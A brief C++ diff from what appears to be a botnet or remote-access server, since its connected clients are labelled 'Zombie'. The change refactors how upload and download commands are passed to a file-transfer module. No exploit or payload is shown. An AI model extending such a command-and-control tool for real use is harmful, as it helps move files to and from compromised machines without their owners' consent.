@@ -14,11 +14,11 @@ void listen_client(Server* serv1, const unsigned short nb)
 
 			if (args[0] == "upload" && args.size() == 2)
 			{
-				Transfer::uploadToClient(serv1,clients[nb].sock, args[1]);
+				Transfer::uploadToClient(serv1,nb, args[1]);
 			}
 			else if (args[0] == "download" && args.size() == 2)
 			{
-				Transfer::downloadFromClient(serv1,clients[nb].sock, args[1]);
+				Transfer::downloadFromClient(serv1,nb, args[1]);
 			}
 			else
 				print_status("Zombie " + std::to_string(nb + 1) + ": " + buffer);
